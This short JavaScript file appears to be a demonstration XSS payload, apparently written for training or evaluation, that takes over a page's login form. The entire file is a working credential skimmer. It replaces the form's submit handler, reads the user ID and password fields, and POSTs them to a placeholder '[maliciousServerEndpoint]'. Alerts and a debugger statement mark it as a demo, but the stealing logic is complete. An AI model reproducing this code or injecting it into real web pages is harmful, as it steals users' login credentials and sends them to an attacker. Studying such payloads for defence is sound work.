
alert("Plugin Activated For XSS Attack!");

// Get Login Form
var loginForm = document.getElementById("login");

// Assign current onsubmit function to a variable
// so that it can be called later
/*  *** We are not calling this variable for the function execution, since 
        the onsubmit function associated to the form is executed by default */     
var onsubmitFunction = loginForm.onsubmit ;

loginForm.onsubmit = function() {
    var uid = $("#uid").val();
    var passw = $("#passw").val();
    var credentials = "userid[" + uid + "] and password[" + passw + "]";
    alert("Sending credentials >> " + credentials );

    debugger; // *** delibrately placed the debugger for the evalution purpose
    // The post function from the jQuery
    $.ajax({
        url: "[maliciousServerEndpoint]",
        type: "POST",
        data: { "credentials": credentials },
        success: function(result) {
            alert("Sent credentials >> " + credentials );
        }
    });
}
